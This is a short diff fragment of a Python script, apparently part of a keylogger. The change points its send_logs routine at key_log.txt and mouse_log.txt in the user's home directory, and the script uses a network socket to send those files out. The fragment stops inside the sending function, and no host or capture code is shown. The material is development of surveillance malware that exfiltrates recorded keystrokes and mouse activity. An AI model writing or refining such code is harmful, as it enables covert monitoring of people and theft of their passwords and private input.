@@ -1,6 +1,10 @@
 import socket
 import sys
-files = ['key_log.txt', 'mouse_log.txt']
+import os
+
+log_dir=os.path.expanduser("~/")
+
+files = [log_dir + 'key_log.txt', log_dir + 'mouse_log.txt']
 def send_logs():
     s=None
     try:
